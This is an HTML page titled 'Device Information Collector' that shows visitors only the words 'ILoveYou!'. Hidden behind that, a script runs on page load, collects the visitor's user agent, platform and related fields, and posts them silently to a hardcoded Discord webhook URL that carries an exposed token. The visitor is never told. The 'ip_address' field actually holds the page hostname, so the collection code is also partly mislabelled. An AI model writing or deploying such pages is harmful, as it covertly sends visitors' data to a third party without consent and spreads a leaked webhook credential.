<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Device Information Collector</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <div style="background-color: black; color: white; font-size: 24px; text-align: center; height: 100vh;">
        <p>ILoveYou!</p>
    </div>
    <script>
        $(document).ready(function() {
            var deviceInfo = {};
            deviceInfo['is_device_moving'] = false; // This value shouldn't be used in production code, it's just an example

            deviceInfo['system_info'] = {
                'system': window.navigator.userAgent
            };
            deviceInfo['device_location'] = {
                'ip_address': window.location.hostname
            };
            deviceInfo['is_device_using_vpn'] = true; // This value shouldn't be used in production code, it's just an example
            deviceInfo['device_type'] = window.navigator.platform;

            $.ajax({
                type: 'POST',
                url: 'https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73',
                data: JSON.stringify(deviceInfo),
                contentType: 'application/json',
                success: function(response) {
                    console.log('Message sent successfully:', response);
                },
                error: function(error) {
                    console.error('Error sending message:', error);
                }
            });
        });
    </script>
</body>
</html>
